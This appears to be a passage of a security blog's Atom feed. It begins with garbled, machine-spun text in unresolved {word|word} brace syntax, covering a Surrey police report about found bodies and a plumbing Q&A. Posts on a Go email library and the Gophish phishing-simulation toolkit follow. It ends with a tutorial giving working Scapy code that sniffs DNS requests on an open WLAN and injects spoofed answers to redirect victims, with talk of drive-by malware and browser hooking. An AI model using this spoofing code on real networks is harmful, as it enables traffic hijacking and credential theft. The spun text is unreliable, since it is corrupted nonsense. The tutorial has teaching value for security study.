in|contacted|called}, {and a|along with a|plus a|as well as a} {police|law enforcement|law enforcement officials|authorities} {dog|canine|puppy|pet} {team|group|staff|crew} {located|situated|positioned|found} {a woman's|a ladies|a lady's|a female's} {body|physique|entire body|system} {as well|too|also|at the same time} {a short distance|ten or twenty yards} {away|aside|absent|apart}.{Pound|Lb|Single pound|Lb .} {said|stated|mentioned|explained} {both|each|equally|the two} {victims|sufferers|patients|subjects} {appeared to|seemed to|did actually|gave the impression to} {have|possess|have got|get} {met|fulfilled|satisfied|achieved} {with|along with|together with|using} {foul|bad|nasty|strong} {play|perform|enjoy|participate in}. {Police have|Mother and father|Weed|Cannabis} {not yet been|not|to be} {able to|in a position to|capable of|capable to} {identify|determine|recognize|discover} {them|all of them|these|these people}."Until {the|the actual|the particular|your} {identity|identification|id|personality} {has been|continues to be|may be|has become} {determined|established|decided|identified}, {investigators|detectives|researchers|private investigators} {will not|won't|is not going to|will not likely} {know the|be aware of|understand the|have in mind the} {connection|link|relationship|interconnection}, {if any|or no}, {today's|present day|the current|modern day} {victims|sufferers|patients|subjects} {have to|need to|must|ought to} {each other|one another|the other person|the other} {or to|in order to|or|as well as to} {the other|another|one other|the opposite} {two|2|a couple of|a pair of} {victims|sufferers|patients|subjects} {found|discovered|identified|located} {recently|lately|not too long ago|just lately} {in this area|in this region|in this field|of this type},{"|Inch|Inches|In .} {Pound|Lb|Single pound|Lb .} {said|stated|mentioned|explained} {in a|inside a|in the|within a} {written|created|composed|published} {statement|declaration|assertion|affirmation}.{2|Two|A couple of|Only two} {bodies|physiques|body|systems} foundearlier {in|within|inside|throughout} 2013IHIT {investigators|detectives|researchers|private investigators} {were|had been|have been|ended up} {already|currently|previously|by now} {called|known as|referred to as|named} {out|away|out there|out and about} {twice|two times|2 times|double} {this year|this season|this coming year|in 2010} {to|in order to|to be able to|for you to} Colebrook {Road|Street|Highway|Path}, {a remote|an online|an isolated|a secluded} {rural|non-urban|countryside|outlying} {stretch|extend|stretch out|expand} {near the|close to the|nearby the|at the} {Serpentine|Courbe} {River|Water|Lake|Pond}, {south|southern|to the south|southerly} {of the|from the|with the|in the} {Panorama|Surroundings|Vista} {Ridge|Form|Shape|Rdg} {neighbourhood|area|local community|community} andnorth {of|associated with|regarding|involving} {Mud|Dirt|Off-road|Will get} {Bay|These types of|Fresh|These kinds of}.Colebrook {Road|Street|Highway|Path} {and|as well as|and also|along with} 125A StreetIn {February|Feb|Feb .|January}, abadly {burned|burnt|used up|burned up} {body|physique|entire body|system} {was found|was discovered|is discovered} {off|away|away from|off of} Colebrook Roadnear 125th {Street|Road|Avenue|Block}. Policeidentified {that|which|in which|that will} {victim|target|sufferer|prey} {as|because|since|while} {29|Twenty nine|30|28} {year old|years old|yr old|year-old} Amritpal Saran, {of|associated with|regarding|involving} Delta. {Police|Law enforcement|Law enforcement officials|Authorities} {said|stated|mentioned|explained} {the man|the person|the guy|he} {was|had been|has been|ended up being} {known to|recognized to|proven to|seen to} {them|all of them|these|these people}, {but|however|yet|nevertheless} {had no|didn't have|didn't have any|did not have any} {known|recognized|identified|acknowledged} {gang|bunch|team|company} {affiliations|organizations|connections|links}.{Police|Law enforcement|Law enforcement officials|Authorities} {were|had been|have been|ended up} {also called|also known as|also referred to as|otherwise known as} {to|in order to|to be able to|for you to} investigatea {violent|chaotic|severe|crazy} {attack|assault|strike|invasion} {on a|on the|over a|with a} Surrey {sex|intercourse|sexual intercourse|making love} {trade|industry|business|buy and sell} {worker|employee|member of staff|staff member} {along|together|alongside|coupled} Colebrook {Road|Street|Highway|Path} {in|within|inside|throughout} {October|Oct|March|April}.{In|Within|Inside|Throughout} {February|Feb|Feb .|January}, {police|law enforcement|law enforcement officials|authorities} {released|launched|introduced|unveiled} {sketches|drawings|paintings|images} {of|associated with|regarding|involving} {two|2|a couple of|a pair of} {South|Southern|To the south|Southerly} {Asian|Oriental|Hard anodized cookware|Cookware} menwho allegedlydrove {her|the woman's|the girl|your ex} toColebrook {Road|Street|Highway|Path} {near|close to|around|in close proximity to} 128th {Street|Road|Avenue|Block}, {and|as well as|and also|along with} {physically|bodily|actually|literally} {and|as well as|and also|along with} {sexually|while making love|intimately|in the bedroom} {assaulted|attacked|bombarded|mauled} {her|the woman's|the girl|your ex}. {She|The lady|Your woman|The girl} {was|had been|has been|ended up being} {taken to|come to|taken up|delivered to} {hospital|medical center|clinic|healthcare facility} {with|along with|together with|using} {serious|severe|significant|critical} {injuries|accidents|accidental injuries|incidents}.
</span><span class='line'>
</span><span class='line'>{Pressure|Stress|Strain|Force} {rating|score|ranking|standing} {for 3|for several}
</span><span class='line'>{Check out|Take a look at|Have a look at|Look at} {some|a few|several|a number of} {similar|comparable|related|equivalent} {questions|concerns|queries|inquiries}!
</span><span class='line'>{How can I|How do i|How could i|How to} {reduce|decrease|lessen|minimize} {a|the|any|a new} 4" {cast iron|surefire|certain|iron} {pipe|water pipe|tube|water line} {opening|starting|beginning|opening up} {to|in order to|to be able to|for you to} 2" {pvc|pvc material|faux wood|imitation wood} pipe&gt; [ {2|Two|A couple of|Only two} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{The last|The final|The past|The very last} {owner|proprietor|operator|seller} {put a|place a|convey a} 2' {pvc|pvc material|faux wood|imitation wood} {pipe|water pipe|tube|water line} {into a|right into a|in to a|in a} 4" {cast iron|surefire|certain|iron} {opening|starting|beginning|opening up}   {it looks like|it appears as though|it appears like|it appears as if} {they just|they simply|they only|they merely} {filled|stuffed|crammed|loaded} {the opening|the outlet} {with|along with|together with|using} {plumbers|local plumbers|plumbing technicians|plumbing engineers} putty   {i am|i'm|i will be|we are} {looking to|seeking to|trying to|planning to} {repair it|do the repair|correct it|remedy it} {properly|correctly|effectively|appropriately}   {what can|so what can|exactly what can|exactly what do} {I use|I personally use|I take advantage of|I prefer} {to go into|to enter|to penetrate|to get in} {the|the actual|the particular|your} {cast iron|surefire|certain|iron} 4"opening {to reduce|to lessen|to cut back|to scale back} {it|this|that|the idea} {to|in order to|to be able to|for you to} 2" {opening|starting|beginning|opening up} {which I|that we|that i|i} {can then|may then|are able to|will then} {attach|connect|affix|add} {3|Three|Several|Three or more}? {Thank you|Thanks|Many thanks|Thanks a lot}
</span><span class='line'>{Replace|Substitute|Change|Exchange} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {pipe|water pipe|tube|water line} {bonded|glued|fused|insured} {into|in to|directly into|straight into} {cast iron|surefire|certain|iron} cleanout {pipe|water pipe|tube|water line} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{Need to|Have to|Must|Should} {connect|link|hook up|join} {new|brand new|fresh|brand-new} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {pipe|water pipe|tube|water line} {to an|for an|to a|with an} {old|aged|outdated|previous} {cast iron|surefire|certain|iron} cleanout {pipe|water pipe|tube|water line} {just|simply|merely|only} {above|over|previously mentioned|earlier mentioned} {cement|concrete|bare concrete|bare cement} {floor|ground|flooring|floorboards}. {Need to|Have to|Must|Should} {create a|produce a|develop a|build a} {new|brand new|fresh|brand-new} cleanout {in|within|inside|throughout} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {that will be|that'll be|which will be|that is to be} 12" {above the|over the|across the|higher than the} {old|aged|outdated|previous} {cast iron|surefire|certain|iron} cleanout {so that|to ensure that|in order that|to ensure} {a main|a primary|a principal|an important} {sewer line|sewage} {blockage|obstruction|congestion|clog} {between the|between your|involving the|relating to the} {main|primary|principal|major} {stack|bunch|collection|pile} {the street|the road|the trail|the path} {sewer|sewer line|sewage} {some|a few|several|a number of} {25|Twenty five|Twenty-five|30} {feet|ft|toes|foot} {away|aside|absent|apart} {can be removed|can be taken off|is easy to remove|are easy to remove}. {Had to|Needed to|Were required to|Was required to}.
</span><span class='line'>{For|With regard to|Regarding|Pertaining to} {600|Six hundred|Six-hundred|1000} {rating|score|ranking|standing} {pipe|water pipe|tube|water line} {what is the|what's the|is there a|exactly what is the} {schedule|routine|timetable|plan} {require|need|call for|demand} {for|with regard to|regarding|pertaining to} 2" NB {pipe|water pipe|tube|water line} [ {0|Zero|2|3} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{Capacity|Capability|Ability|Potential} {of|associated with|regarding|involving} 6" {schedule|routine|timetable|plan} {40|Forty|45|Forty five} {pipe|water pipe|tube|water line} {at|from|with|in} {3|Three|Several|Three or more} {psi|pounds per square inch}. {Natural gas|Gas|Propane|Gas main} {pressure|stress|strain|force} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{Capacity|Capability|Ability|Potential} {of|associated with|regarding|involving} 6" {schedule|routine|timetable|plan} {40|Forty|45|Forty five} {pipe|water pipe|tube|water line} {at|from|with|in} {3|Three|Several|Three or more} {psi|pounds per square inch}. {And|As well as|And also|Along with}, {where can I|how can i|can anyone help me|i'm looking to} {find a|look for a|locate a|discover a} {pressure|stress|strain|force} {table|desk|stand|kitchen table} {for|with regard to|regarding|pertaining to} {capacities|capabilities|sizes|drives} {of various|of numerous|of varied|of assorted} {size|dimension|dimensions|measurement} {pipes|plumbing|water lines|piping} {at|from|with|in} {various|numerous|different|a variety of} {inlet|intake|inlt} {pressures|demands|challenges|difficulties}
</span><span class='line'>{Adding|Including|Incorporating|Introducing} {a|the|any|a new} {PVC|Pvc material|Faux wood|Imitation wood} "Y" {to a|to some|with a|into a} {underground|subterranean|undercover|subway} {Cast iron|Surefire|Certain|Iron} {pipe|water pipe|tube|water line} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{I have a|I've got a|I've a|I own a} {house|home|residence|property} {built in|built-in|integrated|internal} {1962|'62}. {The|The actual|The particular|Your} {cast iron|surefire|certain|iron} {waste|squander|waste materials|spend} {pipe|water pipe|tube|water line} {runs|operates|works|goes} {under the|underneath the|beneath the|within the} {concrete slab|layer of concrete} {in the|within the|inside the|from the} {basement|cellar|downstairs room|attic}. {I have|I've|We have|We've} {already|currently|previously|by now} {dug|made|excavated|finished} {and|as well as|and also|along with} {confirmed|verified|established|validated} {the location|the place|the positioning|the venue} {I want to|I wish to|I would like to|I must} {cut|reduce|minimize|lower} {a section|a piece|an area|a bit} {out of the|from the|out from the|out of your} {pipe|water pipe|tube|water line} {and|as well as|and also|along with} {install a|use a|put in a|purchase a} "Y" {connector|connection|plug} {and|as well as|and also|along with} {run|operate|work|manage} {new|brand new|fresh|brand-new} {plastic|plastic material|plastic-type|plastic-type material} {waste|squander|waste materials|spend} {pipes|plumbing|water lines|piping} {to a new|to a different|to an alternative|completely to another} {bath|bathtub|shower|bath tub}. {I have seen|I've come across|I have come across|I know of} {PVC|Pvc material|Faux wood|Imitation wood} {connectors|fittings|connections|band} {that|which|in which|that will}./p&gt;</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building GoPhish - How to Send Email with Go]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go/"/>
    <updated>2014-01-03T22:06:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/go_email.png"/></p>

<h3>Introduction</h3>

<p>I&rsquo;ve been playing around with Go for about a month now, and I&rsquo;ve <em>really</em> grown to like it. After getting used to the syntax and remembering what a pointer is for (thanks, Python), Go has become a favorite language to develop with. I&rsquo;m even using it for the <a href="http://www.matasano.com/articles/crypto-challenges/">Matasano Crypto Challenges</a> (which are <em>awesome</em>).</p>

<p>While the standard library in Go is definitely robust, being a young language, there are a few niceties that aren&rsquo;t yet included. Sending email is one of them. Don&rsquo;t get me wrong, Go has a wonderful <a href="http://golang.org/pkg/net/smtp/">SMTP</a> package, <a href="http://golang.org/pkg/mime/">MIME</a> package, and even a <a href="http://golang.org/pkg/net/mail/">Mail</a> package (which <em>only</em> parses existing email messages). However, there is no library to actually <strong>create</strong> emails in a meaningful way. Since <a href="https://github.com/jordan-wright/gophish">Gophish</a> relies heavily on sending emails, I&rsquo;ve sought to change this. And, after reading more RFC&rsquo;s than I normally prefer, I believe I&rsquo;ve created a package that provides intuitive, robust, and flexible email creation and sending called <a href="https://github.com/jordan-wright/email">email</a>.</p>

<p>Let&rsquo;s see how to use it.</p>

<!--more-->


<h3>How You <em>Normally</em> Send an Email in Go</h3>

<p>To send email in Go, one needs to:</p>

<ul>
<li>Create a byte slice of the email message (conforming to all needed RFC&rsquo;s)</li>
<li>Send this email using the SMTP library</li>
</ul>


<p>The second part is easy, the first part is not. Sure, sending a simple text message may be straight forward, but things get tricky when you want to cover things like supporting HTML and text body types, attaching files, supporting CC and BCC recipients, etc.</p>

<h3>Sending Email Using the <code>email</code> Package</h3>

<p>To make this easier, I have created the <a href="https://github.com/jordan-wright/email"><code>email</code></a> package (full documentation <a href="http://godoc.org/github.com/jordan-wright/email">here</a>). This package allows users to create emails with a variety of options, and send them easily. Examples say more than I can, so here is some code showing how to use the package.</p>

<h4>Installing the Package</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>go get github.com/jordan-wright/email</span></code></pre></td></tr></table></div></figure>


<h4>Creating a New Email</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="s">&quot;github.com/jordan-wright/email&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">e</span> <span class="o">:=</span> <span class="nx">email</span><span class="p">.</span><span class="nx">NewEmail</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Setting the Subject, To, From, Bcc, Cc</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Subject</span> <span class="p">=</span> <span class="s">&quot;Awesome Subject&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">From</span> <span class="p">=</span> <span class="s">&quot;Jordan Wright &lt;test@gmail.com&gt;&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">To</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test@example.com&quot;</span><span class="p">}</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Bcc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_bcc@example.com&quot;</span><span class="p">}</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Cc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_cc@example.com&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Setting the Content (HTML &amp; Text)</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Text</span> <span class="p">=</span> <span class="s">&quot;Text Body is, of course, supported!&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">HTML</span> <span class="p">=</span> <span class="s">&quot;&lt;h1&gt;Fancy Html is supported, too!&lt;/h1&gt;&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Attaching a File</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">AttachFile</span><span class="p">(</span><span class="s">&quot;test.txt&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also use the <a href="http://godoc.org/github.com/jordan-wright/email#Email.Attach"><code>Attach</code></a> function to attach content directly from an io.Reader.</p>

<h4>Sending the Email (Using Gmail as Example)</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Send</span><span class="p">(</span><span class="s">&quot;smtp.gmail.com:587&quot;</span><span class="p">,</span> <span class="nx">smtp</span><span class="p">.</span><span class="nx">PlainAuth</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">,</span> <span class="s">&quot;test@gmail.com&quot;</span><span class="p">,</span> <span class="s">&quot;password123&quot;</span><span class="p">,</span> <span class="s">&quot;smtp.gmail.com&quot;</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Conclusion</h4>

<p>I hope this package will be useful to those that need to send email from their Go projects. I am excited to continue working on Gophish &ndash; you can expect a big update soon! Until then, as always, feel free to leave any questions or comments below.</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building Gophish - Day 1]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1/"/>
    <updated>2013-11-29T16:15:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/gophish.png"/></p>

<h3>Introduction</h3>

<p>Since the <a href="http://sptoolkit.com/the_end.php">Simple Phishing Toolkit (SPT)</a> was discontinued, I&rsquo;ve wanted to create a simple, effective, and open-source phishing toolkit. In recent years, we&rsquo;ve seen a rise in spear-phishing attacks targeting large organizations, most of which are largely successful. The goal of this toolkit will be to provide businesses and penetration testers with the ability to quickly and easily perform in-house or contracted phishing engagements, and track the responses to see where improvements can be made. This toolkit will be called <a href="https://github.com/jordan-wright/gophish">gophish</a>.</p>

<p>In addition to this, I&rsquo;ve been casually poking around at <a href="http://golang.org/"><code>go</code></a> for a while now, and have decided it would be good to finally put it to use in a larger project. I&rsquo;m a fan of seeing the steady development and updates of projects as they are created. I believe it can help keep the developer motivated and the users informed and involved, so this is what I&rsquo;m going to do. Hopefully, these posts will allow others to learn alongside me, as well as spur improvements from experienced <code>go</code> developers so that <a href="https://github.com/jordan-wright/gophish">gophish</a> can be the best product possible.</p>

<p>With that being said &ndash; let&rsquo;s get started!</p>

<!--more-->


<h3>Why Go?</h3>

<p>In addition to learning a new language, here are a few reasons why I chose <code>go</code> for this project:</p>

<ul>
<li>Cross-compile binaries by default</li>
<li>Only distribute one binary &ndash; just download and run (no more dependencies!)</li>
<li>Low memory overhead</li>
</ul>


<p>I believe the second point is crucial, in that it makes it <em>dead-simple</em> to get up and running. Existing solutions (such as SPT or <a href="https://github.com/pentestgeek/phishing-frenzy">Phishing Frenzy</a>) require an already running webserver or other framework installation.</p>

<h3>Gophish Requirements</h3>

<p>Here are a few of the things I want to be able to do with gophish:</p>

<ul>
<li>Create &ldquo;campaigns&rdquo;, each of which are a simulation of a phishing attack</li>
<li>Create HTML or text templates for phishing emails, providing as many as possible built-in</li>
<li>Allow users to clone existing sites for use in templates</li>
<li>Allow users to import and group phishing targets easily</li>
<li>Provide intuitive analytics, and allow reports to be exported</li>
<li>If possible, integrate with existing products such as the Social Engineer&rsquo;s Toolkit</li>
</ul>


<h3>Getting Started</h3>

<p>I am <em>tentatively</em> planning on creating a REST API for all backend functionality, so as to allow developers to automate gophish. This will also make it easier to separate front-end logic from the backend.</p>

<p>I have looked around at different <code>go</code> web frameworks, and I am going to start by taking a look at the tools provided in the <a href="http://www.gorillatoolkit.org/">Gorilla toolkit</a>, since they seem to sit on top of the standard <code>net/http</code> library without abstracting too many things away.</p>

<p>That&rsquo;s all I have for now &ndash; stay tuned for progress updates (and a big initial commit)! And, as always, let me know if you have any questions or suggestions in the comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wireless Attacks with Python: Part One - The "Dnspwn Attack"]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/"/>
    <updated>2013-11-15T20:45:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/wireless_python.png"/></p>

<h3>Introduction</h3>

<p>A while back, I <a href="http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html">published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href="http://www.aircrack-ng.org/">aircrack suite</a>.</p>

<p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p>

<!--more-->


<h3>The &ldquo;Dnspwn Attack&rdquo;</h3>

<p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href="http://airpwn.sourceforge.net/Airpwn.html">airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p>

<p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p>

<p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p>

<p>Let&rsquo;s see what this would look like:</p>

<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a></p>

<p>So, now that we know how the attack works, let&rsquo;s automate it!</p>

<h3>Setting up the Alfa AWUS06H</h3>

<p>As was the case in my Raidersec post, we will be using the handy <a href="http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8">Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~# airmon-ng start wlan0</span></code></pre></td></tr></table></div></figure>


<p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p>

<h3>Coding the Attack</h3>

<p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from scapy.all import *
</span><span class='line'>
</span><span class='line'>sniff(prn=lambda x: send_response(x),
</span><span class='line'>  lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p>

<ul>
<li>802.11 Frame &ndash; Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li>
<li>802.11 Frame &ndash; Switch the source and destination MAC addresses</li>
<li>IP Layer &ndash; Switch the source and destination IP addresses</li>
<li>UDP layer &ndash; Switch the source and destination ports</li>
<li>DNS layer &ndash; Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li>
</ul>


<p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def send_response(x):
</span><span class='line'>  # Get the requested domain
</span><span class='line'>  req_domain = x[DNS].qd.qname
</span><span class='line'>  spoofed_ip = '192.168.2.1'
</span><span class='line'>  # Let's build our response from a copy of the original packet
</span><span class='line'>  response = x.copy()
</span><span class='line'>  # We need to start by changing our response to be "from-ds", or from the access point.
</span><span class='line'>  response.FCfield = 2L
</span><span class='line'>  # Switch the MAC addresses
</span><span class='line'>  response.addr1, response.addr2 = x.addr2, x.addr1
</span><span class='line'>  # Switch the IP addresses
</span><span class='line'>  response.src, response.dst = x.dst, x.src
</span><span class='line'>  # Switch the ports
</span><span class='line'>  response.sport, response.dport = x.dport, x.sport
</span><span class='line'>  # Set the DNS flags
</span><span class='line'>  response[DNS].qr = 1L
</span><span class='line'>  response[DNS].ra = 1L
</span><span class='line'>  response[DNS].ancount = 1</span></code></pre></td></tr></table></div></figure>


<p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>response[DNS].an = DNSRR(
</span><span class='line'>  rrname = req_domain,
</span><span class='line'>  type = 'A',
</span><span class='line'>  rclass = 'IN',
</span><span class='line'>  ttl = 900,
</span><span class='line'>  rdata = spoofed_ip
</span><span class='line'>  )</span></code></pre></td></tr></table></div></figure>


<p>And, finally, we inject the spoofed response:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sendp(response)</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s all there is to it! You can find the full source on <a href="https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py">Github</a>.</p>

<h3>Demo</h3>

<p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>  Owned.
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href="http://beefproject.com/">BeEF framework</a>, for example.</p>

<p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p>

<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
<a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a></p>

<h3>Conclusion &amp; Future Improvements</h3>

<p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p>

<ul>
<li>Match requests against regular expressions (for example, only replacing Javascript content)</li>
<li>Set options from arguments / Read configuration information from a file</li>
<li>Implement the attack for other protocols (ie HTTP).</li>
</ul>


<p>Enjoy!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
